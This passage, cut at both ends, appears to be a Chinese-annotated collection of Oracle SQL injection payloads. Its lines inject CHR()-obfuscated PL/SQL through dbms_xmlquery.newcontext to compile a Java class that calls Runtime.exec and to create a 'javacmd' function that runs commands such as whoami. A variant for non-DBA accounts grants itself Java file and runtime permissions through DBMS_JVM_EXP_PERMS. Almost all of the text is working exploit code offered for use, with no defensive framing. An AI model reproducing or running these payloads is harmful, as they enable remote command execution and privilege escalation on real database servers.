14)||CHR(101)||CHR(97)||CHR(100)||CHR(76)||CHR(105)||CHR(110)||CHR(101)||CHR(40)||CHR(41)||CHR(41)||CHR(32)||CHR(33)||CHR(61)||CHR(32)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(41)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(32)||CHR(43)||CHR(61)||CHR(32)||CHR(115)||CHR(116)||CHR(43)||CHR(34)||CHR(92)||CHR(110)||CHR(34)||CHR(59)||CHR(109)||CHR(82)||CHR(46)||CHR(99)||CHR(108)||CHR(111)||CHR(115)||CHR(101)||CHR(40)||CHR(41)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(59)||CHR(125)||CHR(125)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
3.创建javacmd函数
' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace function javacmd(p_filename in varchar2)return varchar2 as language java name ''''javaexec.Ecmd(java.lang.String)return String'''';''; commit; end;') from dual) where rownum=1--
' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(112)||CHR(95)||CHR(102)||CHR(105)||CHR(108)||CHR(101)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(105)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(117)||CHR(97)||CHR(103)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(46)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(39)||CHR(39)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
4. 命令执行
' and 1=2 union select 1,(select javacmd('whoami') from dual),'3' from dual--
'||utl_inaddr.get_host_name((select javacmd('ping 8.8.8.8') from dual))||'

not dba(11g只需要java.io.permisson即可,10g额外需要readFileDescriptor writeFileDescriptor权限)
' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(114)||CHR(101)||CHR(115)||CHR(111)||CHR(108)||CHR(118)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(115)||CHR(111)||CHR(117)||CHR(114)||CHR(99)||CHR(101)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(100)||CHR(32)||CHR(34)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(34)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(42)||CHR(59)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(105)||CHR(111)||CHR(46)||CHR(42)||CHR(59)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(99)||CHR(108)||CHR(97)||CHR(115)||CHR(115)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(123)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(115)||CHR(116)||CHR(97)||CHR(116)||CHR(105)||CHR(99)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(115)||CHR(41)||CHR(32)||CHR(116)||CHR(104)||CHR(114)||CHR(111)||CHR(119)||CHR(115)||CHR(32)||CHR(73)||CHR(79)||CHR(69)||CHR(120)||CHR(99)||CHR(101)||CHR(112)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(123)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(32)||CHR(109)||CHR(82)||CHR(61)||CHR(32)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(40)||CHR(41)||CHR(46)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(40)||CHR(115)||CHR(115)||CHR(41)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(40)||CHR(41)||CHR(41)||CHR(41)||CHR(59)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(116)||CHR(44)||CHR(115)||CHR(116)||CHR(114)||CHR(61)||CHR(34)||CHR(34)||CHR(59)||CHR(119)||CHR(104)||CHR(105)||CHR(108)||CHR(101)||CHR(32)||CHR(40)||CHR(40)||CHR(115)||CHR(116)||CHR(61)||CHR(109)||CHR(82)||CHR(46)||CHR(114)||CHR(101)||CHR(97)||CHR(100)||CHR(76)||CHR(105)||CHR(110)||CHR(101)||CHR(40)||CHR(41)||CHR(41)||CHR(32)||CHR(33)||CHR(61)||CHR(32)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(41)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(32)||CHR(43)||CHR(61)||CHR(32)||CHR(115)||CHR(116)||CHR(43)||CHR(34)||CHR(92)||CHR(110)||CHR(34)||CHR(59)||CHR(109)||CHR(82)||CHR(46)||CHR(99)||CHR(108)||CHR(111)||CHR(115)||CHR(101)||CHR(40)||CHR(41)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(59)||CHR(125)||CHR(125)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(112)||CHR(95)||CHR(102)||CHR(105)||CHR(108)||CHR(101)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(105)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(117)||CHR(97)||CHR(103)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(46)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(39)||CHR(39)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
' and dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(109)||CHR(121)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(110)||CHR(117)||CHR(109)||CHR(98)||CHR(101)||CHR(114)||CHR(32)||CHR(105)||CHR(115)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(68)||CHR(69)||CHR(67)||CHR(76)||CHR(65)||CHR(82)||CHR(69)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(32)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(84)||CHR(69)||CHR(77)||CHR(80)||CHR(95)||CHR(74)||CHR(65)||CHR(86)||CHR(65)||CHR(95)||CHR(80)||CHR(79)||CHR(76)||CHR(73)||CHR(67)||CHR(89)||CHR(59)||CHR(67)||CHR(85)||CHR(82)||CHR(83)||CHR(79)||CHR(82)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(73)||CHR(83)||CHR(32)||CHR(32)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(71)||CHR(82)||CHR(65)||CHR(78)||CHR(84)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(40)||CHR(41)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(83)||CHR(89)||CHR(83)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(105)||CHR(111)||CHR(46)||CHR(70)||CHR(105)||CHR(108)||CHR(101)||CHR(80)||CHR(101)||CHR(114)||CHR(109)||CHR(105)||CHR(115)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(32)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(60)||CHR(60)||CHR(65)||CHR(76)||CHR(76)||CHR(32)||CHR(70)||CHR(73)||CHR(76)||CHR(69)||CHR(83)||CHR(62)||CHR(62)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(69)||CHR(78)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(68)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(32)||CHR(102)||CHR(114)||CHR(111)||CHR(109)||CHR(32)||CHR(100)||CHR(117)||CHR(97)||CHR(108)||CHR(59)||CHR(66)||CHR(69)||CHR(71)||CHR(73)||CHR(78)||CHR(32)||CHR(79)||CHR(80)||CHR(69)||CHR(78)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(32)||CHR(32)||CHR(70)||CHR(69)||CHR(84)||CHR(67)||CHR(72)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(66)||CHR(85)||CHR(76)||CHR(75)||CHR(32)||CHR(67)||CHR(79)||CHR(76)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(73)||CHR(78)||CHR(84)||CHR(79)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(59)||CHR(67)||CHR(76)||CHR(79)||CHR(83)||CHR(69)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(73)||CHR(77)||CHR(80)||CHR(79)||CHR(82)||CHR(84)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(40)||CHR(80)||CHR(79)||CHR(76)||CHR(41)||CHR(59)||CHR(69)||CHR(78)||CHR(68)||CHR(59)||CHR(39)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(49)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(32)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) is not null--
' and 1=myjava()--
' and dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(109)||CHR(121)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(49)||CHR(32)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(110)||CHR(117)||CHR(109)||CHR(98)||CHR(101)||CHR(114)||CHR(32)||CHR(105)||CHR(115)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(68)||CHR(69)||CHR(67)||CHR(76)||CHR(65)||CHR(82)||CHR(69)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(32)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(84)||CHR(69)||CHR(77)||CHR(80)||CHR(95)||CHR(74)||CHR(65)||CHR(86)||CHR(65)||CHR(95)||CHR(80)||CHR(79)||CHR(76)||CHR(73)||CHR(67)||CHR(89)||CHR(59)||CHR(67)||CHR(85)||CHR(82)||CHR(83)||CHR(79)||CHR(82)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(73)||CHR(83)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(71)||CHR(82)||CHR(65)||CHR(78)||CHR(84)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(40)||CHR(41)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(83)||CHR(89)||CHR(83)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(80)||CHR(101)||CHR(114)||CHR(109)||CHR(105)||CHR(115)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(119)||CHR(114)||CHR(105)||CHR(116)||CHR(101)||CHR(70)||CHR(105)||CHR(108)||CHR(101)||CHR(68)||CHR(101)||CHR(115)||CHR(99)||CHR(114)||CHR(105)||CHR(112)||CHR(116)||CHR(111)||CHR(114)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(42)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(69)||CHR(78)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(68)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(32)||CHR(102)||CHR(114)||CHR(111)||CHR(109)||CHR(32)||CHR(100)||CHR(117)||CHR(97)||CHR(108)||CHR(59)||CHR(66)||CHR(69)||CHR(71)||CHR(73)||CHR(78)||CHR(32)||CHR(79)||CHR(80)||CHR(69)||CHR(78)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(32)||CHR(70)||CHR(69)||CHR(84)||CHR(67)||CHR(72)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(66)||CHR(85)||CHR(76)||CHR(75)||CHR(32)||CHR(67)||CHR(79)||CHR(76)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(73)||CHR(78)||CHR(84)||CHR(79)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(59)||CHR(67)||CHR(76)||CHR(79)||CHR(83)||CHR(69)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(73)||CHR(77)||CHR(80)||CHR(79)||CHR(82)||CHR(84)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(40)||CHR(80)||CHR(79)||CHR(76)||CHR(41)||CHR(59)||CHR(69)||CHR(78)||CHR(68)||CHR(59)||CHR(39)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(49)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) is not null--
' and 1=myjava1()--
' and dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(